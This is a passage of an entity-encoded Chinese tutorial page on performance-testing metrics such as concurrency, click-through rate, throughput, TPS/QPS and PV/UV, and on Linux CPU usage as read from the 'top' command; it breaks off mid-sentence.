id="1-2-&#x5E76;&#x53D1;"><a href="#1-2-&#x5E76;&#x53D1;" class="headerlink" title="1.2 &#x5E76;&#x53D1;"></a>1.2 &#x5E76;&#x53D1;</h3><p>&#x5E76;&#x53D1;&#x662F;&#x6307;&#x591A;&#x4E2A;&#x7528;&#x6237;&#x5728;&#x540C;&#x4E00;&#x65F6;&#x671F;&#x5185;&#x8FDB;&#x884C;&#x76F8;&#x540C;&#x7684;&#x4E8B;&#x52A1;&#x5904;&#x7406;&#x6216;&#x64CD;&#x4F5C;&#x3002;&#x7531;&#x4E8E;&#x7528;&#x6237;&#x5728;&#x8FDB;&#x884C;&#x4E00;&#x7CFB;&#x5217;&#x64CD;&#x4F5C;&#x6D41;&#x7A0B;&#x65F6;&#x6709;&#x4E00;&#x5B9A;&#x7684;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#xFF08;&#x5373;&#x7528;&#x6237;&#x601D;&#x8003;&#x65F6;&#x95F4;&#xFF09;&#x6216;&#x8005;&#x670D;&#x52A1;&#x5668;&#x5904;&#x7406;&#x8BF7;&#x6C42;&#x6709;&#x5148;&#x540E;&#x987A;&#x5E8F;&#xFF0C;&#x4E8E;&#x662F;&#xFF0C;&#x5C31;&#x4EA7;&#x751F;&#x4E86;&#x7EDD;&#x5BF9;&#x5E76;&#x53D1;&#x548C;&#x76F8;&#x5BF9;&#x5E76;&#x53D1;&#x6982;&#x5FF5;&#x7684;&#x533A;&#x5206;&#x3002;</p><p>&#x7EDD;&#x5BF9;&#x5E76;&#x53D1;&#x662F;&#x6307;&#x540C;&#x4E00;&#x65F6;&#x523B;&#xFF08;&#x5373;&#x540C;&#x4E00;&#x65F6;&#x95F4;&#x70B9;&#xFF09;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x540C;&#x65F6;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x3002;</p><p>&#x76F8;&#x5BF9;&#x5E76;&#x53D1;&#x662F;&#x6307;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x5185;&#xFF08;&#x5373;&#x540C;&#x4E00;&#x65F6;&#x95F4;&#x533A;&#x95F4;&#xFF09;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x3002;</p><p>&#x4E3E;&#x4E2A;&#x4F8B;&#x5B50;&#xFF0C;&#x4E00;&#x4E2A;&#x5E76;&#x53D1;&#x91CF;&#x4E3A;10000&#x4EBA;&#xFF08;&#x53EF;&#x540C;&#x65F6;&#x5BB9;&#x7EB3;10000&#x4EBA;&#xFF09;&#x7684;&#x52A8;&#x7269;&#x56ED;&#xFF0C;&#x8FD9;&#x91CC;&#x7684;&#x5E76;&#x53D1;&#x91CF;&#x662F;&#x6307;&#x7EDD;&#x5BF9;&#x5E76;&#x53D1;&#x8FD8;&#x662F;&#x76F8;&#x5BF9;&#x5E76;&#x53D1;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x5F88;&#x5BB9;&#x6613;&#x7406;&#x89E3;&#xFF0C;&#x8FD9;&#x4E2A;&#x5E76;&#x53D1;&#x6307;&#x7684;&#x662F;&#x76F8;&#x5BF9;&#x5E76;&#x53D1;&#xFF0C;&#x56E0;&#x4E3A;&#x6574;&#x4E2A;&#x52A8;&#x7269;&#x56ED;&#x662F;&#x4E00;&#x4E2A;&#x4EA4;&#x7EC7;&#x7684;&#x7F51;&#x72B6;&#x7ED3;&#x6784;&#xFF0C;&#x51FA;&#x5165;&#x53E3;&#x3001;&#x8001;&#x864E;&#x3001;&#x72EE;&#x5B50;&#x3001;&#x5927;&#x8C61;&#x7B49;&#x5404;&#x4E2A;&#x52A8;&#x7269;&#x7AD9;&#x70B9;&#x90FD;&#x6709;&#x5206;&#x6D41;&#x7684;&#x4F5C;&#x7528;&#xFF0C;&#x57FA;&#x672C;&#x4E0D;&#x53EF;&#x80FD;&#x51FA;&#x73B0;&#x51FA;&#x5165;&#x53E3;&#x6216;&#x8005;&#x7AD9;&#x70B9;&#x80FD;&#x591F;&#x540C;&#x65F6;&#x627F;&#x8F7D;10000&#x4EBA;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x51FA;&#x5165;&#x53E3;&#x7684;&#x5E76;&#x53D1;&#x53EF;&#x80FD;&#x53EA;&#x6709;200&#x4EBA;&#x3002;&#x56E0;&#x6B64;&#x8FD9;&#x4E2A;&#x52A8;&#x7269;&#x56ED;&#x7684;&#x4F8B;&#x5B50;&#x91CC;&#xFF0C;&#x5E76;&#x53D1;&#x91CF;10000&#x662F;&#x6307;&#x5404;&#x4E2A;&#x8282;&#x70B9;&#x7684;&#x603B;&#x548C;&#xFF0C;&#x53C2;&#x89C2;&#x8005;&#x53C2;&#x89C2;&#x52A8;&#x7269;&#x56ED;&#x6709;&#x8DEF;&#x5F84;&#x7684;&#x5148;&#x540E;&#x987A;&#x5E8F;&#xFF0C;&#x662F;&#x76F8;&#x5BF9;&#x5E76;&#x53D1;&#x7684;&#x6982;&#x5FF5;&#x3002;&#x800C;&#x51FA;&#x5165;&#x53E3;&#x7684;&#x5E76;&#x53D1;&#x91CF;&#x662F;200&#x4EBA;&#xFF0C;&#x5219;&#x662F;&#x6307;&#x540C;&#x4E00;&#x65F6;&#x95F4;&#x5728;&#x51FA;&#x5165;&#x53E3;&#x80FD;&#x591F;&#x540C;&#x65F6;&#x5BB9;&#x7EB3;200&#x4EBA;&#xFF0C;&#x8FD9;&#x5C31;&#x662F;&#x7EDD;&#x5BF9;&#x5E76;&#x53D1;&#x7684;&#x6982;&#x5FF5;&#x3002;</p><p>&#x4E00;&#x822C;&#x6765;&#x8BF4;&#xFF0C;&#x5728;&#x7CFB;&#x7EDF;&#x7684;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x4E2D;&#xFF0C;&#x7CFB;&#x7EDF;&#x6216;&#x8005;&#x6A21;&#x5757;&#x7684;&#x5E76;&#x53D1;&#x66F4;&#x591A;&#x662F;&#x6307;&#x76F8;&#x5BF9;&#x5E76;&#x53D1;&#xFF0C;&#x800C;&#x63A5;&#x53E3;&#x7684;&#x5E76;&#x53D1;&#x66F4;&#x503E;&#x5411;&#x4E8E;&#x7EDD;&#x5BF9;&#x5E76;&#x53D1;&#x3002;&#x5E76;&#x53D1;&#x6027;&#x80FD;&#x7684;&#x6982;&#x5FF5;&#x662F;&#x6307;&#x7CFB;&#x7EDF;&#x3001;&#x6A21;&#x5757;&#x6216;&#x63A5;&#x53E3;&#x7A33;&#x5B9A;&#x8FD0;&#x884C;&#xFF0C;&#x4E0D;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#x6240;&#x80FD;&#x591F;&#x627F;&#x8F7D;&#x7684;&#x5E76;&#x53D1;&#x91CF;&#x3002;</p><p>&#x5728;&#x5E76;&#x53D1;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x4E2D;&#x5E38;&#x7528;&#x5230;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x548C;&#x5E76;&#x53D1;&#x8BF7;&#x6C42;&#x6570;&#x4E24;&#x4E2A;&#x6307;&#x6807;&#x3002;&#x987E;&#x540D;&#x601D;&#x4E49;&#xFF0C;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x662F;&#x6307;&#x540C;&#x4E00;&#x65F6;&#x95F4;&#xFF08;&#x70B9;&#x6216;&#x533A;&#x95F4;&#xFF09;&#xFF0C;&#x7CFB;&#x7EDF;&#x3001;&#x6A21;&#x5757;&#x6216;&#x63A5;&#x53E3;&#x80FD;&#x591F;&#x627F;&#x8F7D;&#x7684;&#x7528;&#x6237;&#x6570;&#x91CF;&#xFF1B;&#x5E76;&#x53D1;&#x8BF7;&#x6C42;&#x6570;&#x662F;&#x6307;&#x540C;&#x4E00;&#x65F6;&#x95F4;&#xFF08;&#x70B9;&#x6216;&#x533A;&#x95F4;&#xFF09;&#xFF0C;&#x7CFB;&#x7EDF;&#x3001;&#x6A21;&#x5757;&#x6216;&#x63A5;&#x53E3;&#x80FD;&#x591F;&#x627F;&#x8F7D;&#x7684;&#x8BF7;&#x6C42;&#x6570;&#x91CF;&#x3002;</p><h3 id="1-3-&#x70B9;&#x51FB;&#x91CF;-&#x70B9;&#x51FB;&#x7387;"><a href="#1-3-&#x70B9;&#x51FB;&#x91CF;-&#x70B9;&#x51FB;&#x7387;" class="headerlink" title="1.3 &#x70B9;&#x51FB;&#x91CF;/&#x70B9;&#x51FB;&#x7387;"></a>1.3 &#x70B9;&#x51FB;&#x91CF;/&#x70B9;&#x51FB;&#x7387;</h3><p>&#x70B9;&#x51FB;&#x91CF;&#x662F;&#x8861;&#x91CF;&#x7F51;&#x7AD9;&#x6D41;&#x91CF;&#x7684;&#x4E00;&#x4E2A;&#x6307;&#x6807;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x70B9;&#x51FB;&#x6570;clicks&#xFF0C;&#x662F;&#x5BF9;&#x7F51;&#x7AD9;&#x70B9;&#x51FB;&#x6570;&#x636E;&#x7684;&#x7EDF;&#x8BA1;&#x3002;</p><p>&#x70B9;&#x51FB;&#x7387;&#xFF08;Clicks Ratio&#xFF09;&#x4E5F;&#x53EF;&#x4EE5;&#x53EB;&#x505A;&#x70B9;&#x8FDB;&#x7387;&#xFF08;&#x201C;Click-through Rate&#xFF09;&#xFF0C;&#x5B83;&#x662F;&#x7F51;&#x7AD9;&#x4E0A;&#x67D0;&#x4E00;&#x5185;&#x5BB9;&#x88AB;&#x70B9;&#x51FB;&#x7684;&#x6B21;&#x6570;&#x4E0E;&#x6574;&#x4E2A;&#x7F51;&#x7AD9;&#x5185;&#x5BB9;&#x88AB;&#x663E;&#x793A;&#x6B21;&#x6570;&#x4E4B;&#x6BD4;&#xFF0C;&#x5373;clicks/views&#x3002;&#x53CD;&#x5E94;&#x4E86;&#x7F51;&#x7AD9;&#x4E0A;&#x67D0;&#x4E00;&#x9875;&#x9762;&#x6216;&#x5185;&#x5BB9;&#x7684;&#x53D7;&#x5173;&#x6CE8;&#x7A0B;&#x5EA6;&#xFF0C;&#x7ECF;&#x5E38;&#x7528;&#x6765;&#x8861;&#x91CF;&#x5E7F;&#x544A;&#x7684;&#x5438;&#x5F15;&#x7A0B;&#x5EA6;&#x3002;&#x6BD4;&#x5982;&#x516C;&#x4F17;&#x53F7;&#x7684;&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x88AB;&#x6D4F;&#x89C8;&#x4E86;10w&#x6B21;&#xFF0C;&#x6587;&#x7AE0;&#x4E2D;&#x7684;&#x5E7F;&#x544A;&#x94FE;&#x63A5;&#x88AB;&#x70B9;&#x51FB;&#x4E86;2000&#x6B21;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x6761;&#x5E7F;&#x544A;&#x7684;&#x70B9;&#x51FB;&#x7387;&#x662F;2%&#xFF08;2000/100000*100%&#xFF09;&#x3002;</p><p>&#x5728;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x9886;&#x57DF;&#xFF0C;&#x70B9;&#x51FB;&#x7387;&#xFF08;hit rate&#xFF09;&#x5E38;&#x6307;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185;&#xFF08;&#x6BCF;&#x79D2;&#x949F;&#xFF09;&#x9875;&#x9762;&#x7684;&#x70B9;&#x51FB;&#x6570;&#xFF0C;&#x5373;&#x6BCF;&#x79D2;&#x949F;&#x53D1;&#x9001;&#x7684;http&#x8BF7;&#x6C42;&#x6570;&#x91CF;&#xFF0C;&#x70B9;&#x51FB;&#x7387;&#x8D8A;&#x5927;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x9020;&#x6210;&#x7684;&#x538B;&#x529B;&#x4E5F;&#x8D8A;&#x5927;&#xFF0C;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x7684;&#x6027;&#x80FD;&#x8981;&#x6C42;&#x4E5F;&#x8D8A;&#x9AD8;&#x3002;</p><p>&#x6709;&#x4E9B;&#x4EBA;&#x5BB9;&#x6613;&#x6DF7;&#x6DC6;&#x70B9;&#x51FB;&#x7387;&#x548C;&#x70B9;&#x51FB;&#x91CF;&#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x6BD4;&#x5982;&#x6211;&#x4EEC;&#x7ECF;&#x5E38;&#x4F1A;&#x542C;&#x5230;&#x6709;&#x4EBA;&#x8BF4;&#x67D0;&#x7F51;&#x7AD9;&#x7684;&#x70B9;&#x51FB;&#x7387;&#x662F;&#x591A;&#x591A;&#x4E07;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#x8FD9;&#x91CC;&#x7684;&#x70B9;&#x51FB;&#x7387;&#x6307;&#x7684;&#x662F;&#x70B9;&#x51FB;&#x91CF;&#xFF0C;&#x66DD;&#x5149;&#x7387;&#x6216;&#x8005;&#x8BF4;&#x9875;&#x9762;&#x6D4F;&#x89C8;&#x91CF;&#x3002;</p><h3 id="1-4-&#x541E;&#x5410;&#x91CF;-&#x541E;&#x5410;&#x7387;"><a href="#1-4-&#x541E;&#x5410;&#x91CF;-&#x541E;&#x5410;&#x7387;" class="headerlink" title="1.4 &#x541E;&#x5410;&#x91CF;/&#x541E;&#x5410;&#x7387;"></a>1.4 &#x541E;&#x5410;&#x91CF;/&#x541E;&#x5410;&#x7387;</h3><p>&#x541E;&#x5410;&#x91CF;&#x662F;&#x6307;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x5BA2;&#x6237;&#x8BF7;&#x6C42;&#x6570;&#x91CF;&#x7684;&#x603B;&#x548C;&#xFF0C;&#x53EF;&#x4EE5;&#x6307;&#x7F51;&#x7EDC;&#x4E0A;&#x4F20;&#x8F93;&#x6570;&#x636E;&#x5305;&#x7684;&#x603B;&#x548C;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x6307;&#x4E1A;&#x52A1;&#x4E2D;&#x5BA2;&#x6237;&#x7AEF;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x4EA4;&#x4E92;&#x6570;&#x636E;&#x91CF;&#x7684;&#x603B;&#x548C;&#x3002;</p><p>&#x541E;&#x5410;&#x7387;&#x662F;&#x6307;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x5BA2;&#x6237;&#x8BF7;&#x6C42;&#x7684;&#x6570;&#x91CF;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185;&#x7684;&#x541E;&#x5410;&#x91CF;&#x3002;&#x53EF;&#x4EE5;&#x4ECE;&#x591A;&#x4E2A;&#x7EF4;&#x5EA6;&#x8861;&#x91CF;&#x541E;&#x5410;&#x7387;&#xFF1A;&#x2460;&#x4E1A;&#x52A1;&#x89D2;&#x5EA6;&#xFF1A;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#xFF08;&#x6BCF;&#x79D2;&#xFF09;&#x7684;&#x8BF7;&#x6C42;&#x6570;&#x6216;&#x9875;&#x9762;&#x6570;&#xFF0C;&#x5373;&#x8BF7;&#x6C42;&#x6570;/&#x79D2;&#x6216;&#x9875;&#x9762;&#x6570;/&#x79D2;&#xFF1B;&#x2461;&#x7F51;&#x7EDC;&#x89D2;&#x5EA6;&#xFF1A;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#xFF08;&#x6BCF;&#x79D2;&#xFF09;&#x7F51;&#x7EDC;&#x4E2D;&#x4F20;&#x8F93;&#x7684;&#x6570;&#x636E;&#x5305;&#x5927;&#x5C0F;&#xFF0C;&#x5373;&#x5B57;&#x8282;&#x6570;/&#x79D2;&#x7B49;&#xFF1B;&#x2462;&#x7CFB;&#x7EDF;&#x89D2;&#x5EA6;&#xFF0C;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185;&#x670D;&#x52A1;&#x5668;&#x6240;&#x627F;&#x53D7;&#x7684;&#x538B;&#x529B;&#xFF0C;&#x5373;&#x7CFB;&#x7EDF;&#x7684;&#x8D1F;&#x8F7D;&#x80FD;&#x529B;&#x3002;</p><p>&#x541E;&#x5410;&#x7387;&#xFF08;&#x6216;&#x541E;&#x5410;&#x91CF;&#xFF09;&#x662F;&#x4E00;&#x79CD;&#x591A;&#x7EF4;&#x5EA6;&#x91CF;&#x7684;&#x6027;&#x80FD;&#x6307;&#x6807;&#xFF0C;&#x5B83;&#x4E0E;&#x8BF7;&#x6C42;&#x5904;&#x7406;&#x6240;&#x6D88;&#x8017;&#x7684;CPU&#x3001;&#x5185;&#x5B58;&#x3001;IO&#x548C;&#x7F51;&#x7EDC;&#x5E26;&#x5BBD;&#x90FD;&#x5F3A;&#x76F8;&#x5173;&#x3002;</p><h3 id="1-5-TPS-QPS"><a href="#1-5-TPS-QPS" class="headerlink" title="1.5 TPS/QPS"></a>1.5 TPS/QPS</h3><p>TPS&#xFF08;Transaction Per Second&#xFF09;&#x662F;&#x6307;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#xFF08;&#x6BCF;&#x79D2;&#xFF09;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x7684;&#x4E8B;&#x52A1;&#x91CF;&#x3002;&#x4E8B;&#x52A1;&#x53EF;&#x4EE5;&#x662F;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x4E00;&#x7CFB;&#x5217;&#x64CD;&#x4F5C;&#x6216;&#x8005;&#x52A8;&#x4F5C;&#x7684;&#x96C6;&#x5408;&#xFF0C;&#x6BD4;&#x5982;&#x201C;&#x7528;&#x6237;&#x6CE8;&#x518C;&#x201C;&#x4E8B;&#x52A1;&#x662F;&#x70B9;&#x51FB;&#x6CE8;&#x518C;&#x6309;&#x94AE;&#xFF0C;&#x586B;&#x5199;&#x7528;&#x6237;&#x6CE8;&#x518C;&#x4FE1;&#x606F;&#xFF0C;&#x70B9;&#x51FB;&#x63D0;&#x4EA4;&#x6309;&#x94AE;&#xFF0C;&#x4EE5;&#x53CA;&#x52A0;&#x8F7D;&#x6CE8;&#x518C;&#x6210;&#x529F;&#x9875;&#x9762;&#x7684;&#x52A8;&#x4F5C;&#x96C6;&#x5408;&#x3002;</p><p>QPS&#xFF08;Query Per Second&#xFF09;&#x662F;&#x6307;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185;&#x67E5;&#x8BE2;&#x6216;&#x8BBF;&#x95EE;&#x670D;&#x52A1;&#x5668;&#x7684;&#x6B21;&#x6570;&#x3002;</p><p>TPS&#x548C;QPS&#x7684;&#x533A;&#x522B;&#x5728;&#x4E8E;&#x4E00;&#x4E2A;&#x4E8B;&#x52A1;&#x53EF;&#x4EE5;&#x5305;&#x542B;&#x591A;&#x6B21;&#x67E5;&#x8BE2;&#x6216;&#x8BBF;&#x95EE;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x53EA;&#x67E5;&#x8BE2;&#x6216;&#x8BBF;&#x95EE;&#x4E00;&#x6B21;&#x670D;&#x52A1;&#x5668;&#x3002;&#x5F53;&#x591A;&#x6B21;&#x67E5;&#x8BE2;&#x6216;&#x8BBF;&#x95EE;&#x65F6;&#xFF0C;&#x4E00;&#x4E2A;TPS&#x76F8;&#x5F53;&#x4E8E;&#x591A;&#x4E2A;QPS&#xFF1B;&#x5F53;&#x53EA;&#x67E5;&#x8BE2;&#x6216;&#x8BBF;&#x95EE;&#x4E00;&#x6B21;&#x65F6;&#xFF0C;&#x4E00;&#x4E2A;TPS&#x5219;&#x7B49;&#x4EF7;&#x4E8E;&#x4E00;&#x4E2A;QPS&#x3002;</p><h3 id="1-6-PV-UV"><a href="#1-6-PV-UV" class="headerlink" title="1.6 PV/UV"></a>1.6 PV/UV</h3><p>PV&#x548C;UV&#x662F;&#x8861;&#x91CF;web&#x7F51;&#x7AD9;&#x6027;&#x80FD;&#x5BB9;&#x91CF;&#x7684;&#x4E24;&#x4E2A;&#x91CD;&#x8981;&#x5EA6;&#x91CF;&#x6307;&#x6807;&#xFF0C;&#x7ECF;&#x5E38;&#x7528;&#x5728;&#x7535;&#x5B50;&#x5546;&#x52A1;&#x7F51;&#x7AD9;&#x9886;&#x57DF;&#x4E2D;&#x7528;&#x6765;&#x8861;&#x91CF;&#x7F51;&#x7AD9;&#x7684;&#x6D3B;&#x8DC3;&#x5EA6;&#x3002;</p><p>PV&#xFF08;Page View&#xFF09;&#x662F;&#x9875;&#x9762;&#x7684;&#x6D4F;&#x89C8;&#x91CF;&#x6216;&#x70B9;&#x51FB;&#x91CF;&#xFF0C;&#x7528;&#x6237;&#x5BF9;&#x7CFB;&#x7EDF;&#x6216;&#x8005;&#x7F51;&#x7AD9;&#x4EFB;&#x4F55;&#x9875;&#x9762;&#x7684;&#x6BCF;&#x4E00;&#x6B21;&#x70B9;&#x51FB;&#x6216;&#x8005;&#x8BBF;&#x95EE;&#x90FD;&#x4F1A;&#x88AB;&#x8BB0;&#x5F55;&#x4E00;&#x6B21;&#x6D4F;&#x89C8;&#x91CF;&#x6216;&#x70B9;&#x51FB;&#x91CF;&#xFF0C;&#x5BF9;&#x76F8;&#x540C;&#x9875;&#x9762;&#x8FDB;&#x884C;&#x591A;&#x6B21;&#x8BBF;&#x95EE;&#x6D4F;&#x89C8;&#x91CF;&#x6216;&#x70B9;&#x51FB;&#x91CF;&#x4E5F;&#x4F1A;&#x8FDB;&#x884C;&#x7D2F;&#x8BA1;&#x3002;</p><p>UV&#xFF08;Unique Vistor&#xFF09;&#x662F;&#x7CFB;&#x7EDF;&#x6216;&#x8005;&#x7F51;&#x7AD9;&#x7684;&#x72EC;&#x7ACB;&#x8BBF;&#x5BA2;&#xFF0C;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x5185;&#x76F8;&#x540C;&#x5BA2;&#x6237;&#x7AEF;&#xFF08;&#x6216;PC&#xFF09;&#x8BBF;&#x95EE;&#x7CFB;&#x7EDF;&#x6216;&#x8005;&#x7F51;&#x7AD9;&#x53EA;&#x4F1A;&#x88AB;&#x8BB0;&#x5F55;&#x4E00;&#x6B21;&#xFF0C;&#x8FDE;&#x7EED;&#x91CD;&#x590D;&#x8BBF;&#x95EE;&#x6216;&#x8005;&#x6D4F;&#x89C8;&#x591A;&#x4E2A;&#x7CFB;&#x7EDF;&#x9875;&#x9762;&#x6B21;&#x6570;&#x4E0D;&#x4F1A;&#x8FDB;&#x884C;&#x7D2F;&#x8BA1;&#x3002;</p><p>PV&#x548C;UV&#x6309;&#x7167;&#x7EDF;&#x8BA1;&#x5468;&#x671F;&#x5212;&#x5206;&#xFF0C;&#x53EF;&#x4EE5;&#x5212;&#x5206;&#x4E3A;&#x5168;&#x5929;PV&#x3001;&#x6BCF;&#x5C0F;&#x65F6;PV&#x3001;&#x5168;&#x5929;UV&#x548C;&#x6BCF;&#x5C0F;&#x65F6;UV&#x7B49;&#x3002;&#x5728;&#x4E00;&#x4E9B;&#x6570;&#x636E;&#x6216;&#x4EA4;&#x6613;&#x91CF;&#x975E;&#x5E38;&#x5E9E;&#x5927;&#x7684;&#x573A;&#x666F;&#x4E2D;&#xFF0C;&#x6BD4;&#x5982;&#x53CC;11&#x6216;618&#x7B49;&#x5168;&#x6C11;&#x8D2D;&#x7269;&#x6D3B;&#x52A8;&#x65F6;&#xFF0C;&#x5E38;&#x5E38;&#x8FD8;&#x4F1A;&#x7EDF;&#x8BA1;&#x5CF0;&#x503C;PV&#x548C;&#x5CF0;&#x503C;UV&#x3002;</p><h2 id="Linux&#x670D;&#x52A1;&#x5668;&#x6027;&#x80FD;&#x6307;&#x6807;"><a href="#Linux&#x670D;&#x52A1;&#x5668;&#x6027;&#x80FD;&#x6307;&#x6807;" class="headerlink" title="Linux&#x670D;&#x52A1;&#x5668;&#x6027;&#x80FD;&#x6307;&#x6807;"></a>Linux&#x670D;&#x52A1;&#x5668;&#x6027;&#x80FD;&#x6307;&#x6807;</h2><h3 id="2-1-CPU&#x4F7F;&#x7528;&#x7387;"><a href="#2-1-CPU&#x4F7F;&#x7528;&#x7387;" class="headerlink" title="2.1 CPU&#x4F7F;&#x7528;&#x7387;"></a>2.1 CPU&#x4F7F;&#x7528;&#x7387;</h3><p>CPU&#x4F7F;&#x7528;&#x7387;&#x662F;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185;&#x670D;&#x52A1;&#x5668;CPU&#x7684;&#x4F7F;&#x7528;&#x7EDF;&#x8BA1;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x9664;CPU&#x7A7A;&#x95F2;&#x65F6;&#x95F4;&#x5916;&#x5176;&#x4ED6;&#x65F6;&#x95F4;&#x5360;&#x603B;CPU&#x65F6;&#x95F4;&#x7684;&#x767E;&#x5206;&#x6BD4;&#x6765;&#x8868;&#x793A;&#xFF0C;&#x5373;&#xFF1A;CPU&#x4F7F;&#x7528;&#x7387;=1-CPU&#x7A7A;&#x95F2;&#x65F6;&#x95F4;/&#x603B;CPU&#x65F6;&#x95F4;</p><pre><code class="shell">top ## top&#x547D;&#x4EE4;&#x95F4;&#x9694;3s&#x4F1A;&#x52A8;&#x6001;&#x6EDA;&#x52A8;&#x66F4;&#x65B0;&#x4E00;&#x6B21;&#x6570;&#x636E;</code></pre><p><img src="http://192.168.84.188:8081/uploads/1652923805160103382topcmd.png" alt=""></p><p>&#x5B57;&#x6BB5;&#x8BF4;&#x660E;&#xFF1A;</p><p>us (user)&#xFF1A;&#x7528;&#x6237;&#x6001;&#x7684;CPU&#x4F7F;&#x7528;&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#xFF0C;&#x662F;&#x7528;&#x6237;&#x8FD0;&#x884C;&#x7A0B;&#x5E8F;&#x7684;&#x771F;&#x6B63;&#x65F6;&#x95F4;&#xFF0C;&#x5B83;&#x4E0D;&#x5305;&#x62EC;&#x540E;&#x9762;&#x7684;ni&#x65F6;&#x95F4;&#xFF1B;</p><p>sy (system): &#x5185;&#x6838;&#x6001;&#x7684;CPU&#x4F7F;&#x7528;&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#xFF0C;&#x662F;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7684;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#xFF0C;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8FD0;&#x884C;&#x65F6;&#xFF0C;&#x7528;&#x6237;&#x8FD0;&#x884C;&#x7A0B;&#x5E8F;&#x5F80;&#x5F80;&#x5904;&#x4E8E;&#x7B49;&#x5F85;&#x72B6;&#x6001;&#xFF1B;</p><p>ni (nice): &#x8868;&#x793A;&#x4F4E;&#x4F18;&#x5148;&#x7EA7;&#x7528;&#x6237;&#x6001;&#x7684;CPU&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#xFF0C;&#x53D6;&#x503C;&#x8303;&#x56F4;&#x4E3A;[-20,19]&#xFF0C;&#x6570;&#x503C;&#x8D8A;&#x5927;&#xFF0C;&#x5219;&#x4F18;&#x5148;&#x7EA7;&#x8D8A;&#x4F4E;&#xFF1B;</p><p>id (idle): &#x8868;&#x793A;&#x7A7A;&#x95F2;&#x7684;CPU&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#xFF0C;&#x503C;&#x8D8A;&#x5927;&#xFF0C;CPU&#x7A7A;&#x95F2;&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#x8D8A;&#x9AD8;&#xFF0C;&#x5229;&#x7528;&#x7387;&#x8D8A;&#x4F4E;&#xFF1B;</p><p>wa (iowait): &#x8868;&#x793A;&#x5904;&#x4E8E;IO&#x7B49;&#x5F85;&#x72B6;&#x6001;&#x7684;CPU&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#xFF1B;</p><p>hi (hard interrupt): &#x8868;&#x793A;&#x5904;&#x7406;&#x786C;&#x4E2D;&#x65AD;&#x7684;CPU&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#xFF1B;</p><p>si (soft interrupt): &#x4E0E;hi&#x76F8;&#x53CD;&#xFF0C;&#x8868;&#x793A;&#x5904;&#x7406;&#x8F6F;&#x4E2D;&#x65AD;&#x7684;CPU&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#xFF1B;</p><p>st (steal): &#x8868;&#x793A;&#x5F53;&#x524D;&#x7CFB;&#x7EDF;&#x8FD0;&#x884C;&#x5728;&#x865A;&#x62DF;&#x673A;&#x4E2D;&#x88AB;&#x5176;&#x4ED6;&#x865A;&#x62DF;&#x673A;&#x5360;&#x7528;&#x7684;CPU&#x65F6;&#x95F4;&#x6BD4;&#x4F8B;&#x3002;</p><p>&#x5728;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x4E2D;&#xFF0C;&#x7CFB;&#x7EDF;&#x6574;&#x4F53;&#x7684;CPU&#x4F7F;&#x7528;&#x7387;&#x53EF;&#x4EE5;&#x7528;&#xFF08;1-id&#xFF09;&#x6765;&#x8BA1;&#x7B97;&#x3002;&#x5F53;us&#x5F88;&#x9AD8;&#x65F6;&#xFF0C;&#x8BF4;&#x660E;CPU&#x65F6;&#x95F4;&#x4E3B;&#x8981;&#x6D88;&#x8017;&#x5728;&#x7528;&#x6237;&#x4EE3;&#x7801;&#x4E0A;&#xFF0C;&#x53EF;&#x4EE5;&#x4ECE;&#x7528;&#x6237;&#x4EE3;&#x7801;&#x89D2;&#x5EA6;&#x8003;&#x8651;&#x4F18;&#x5316;&#x6027;&#x80FD;&#xFF1B;&#x5F53;sy&#x5F88;&#x9AD8;&#x65F6;&#xFF0C;&#x8BF4;&#x660E;CPU&#x65F6;&#x